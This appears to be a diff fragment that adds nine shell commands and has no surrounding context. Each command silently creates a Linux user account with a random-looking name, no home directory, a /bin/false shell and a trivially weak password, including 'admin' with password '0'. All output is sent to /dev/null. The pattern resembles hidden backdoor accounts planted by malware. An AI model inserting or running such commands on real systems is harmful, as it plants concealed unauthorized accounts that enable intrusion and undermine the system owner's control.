@@ -1,0 +1,9 @@
+/usr/sbin/useradd -p $(openssl passwd -1 194m) -s /bin/false -M tofl &> /dev/null;
+/usr/sbin/useradd -p $(openssl passwd -1 ggwr) -s /bin/false -M xf5w &> /dev/null;
+/usr/sbin/useradd -p $(openssl passwd -1 g3d6) -s /bin/false -M o4ty &> /dev/null;
+/usr/sbin/useradd -p $(openssl passwd -1 qv8s) -s /bin/false -M ukeb &> /dev/null;
+/usr/sbin/useradd -p $(openssl passwd -1 v67t) -s /bin/false -M oen6 &> /dev/null;
+/usr/sbin/useradd -p $(openssl passwd -1 m96c) -s /bin/false -M epka &> /dev/null;
+/usr/sbin/useradd -p $(openssl passwd -1 5hme) -s /bin/false -M 89ml &> /dev/null;
+/usr/sbin/useradd -p $(openssl passwd -1 1234) -s /bin/false -M one &> /dev/null;
+/usr/sbin/useradd -p $(openssl passwd -1 0) -s /bin/false -M admin &> /dev/null;
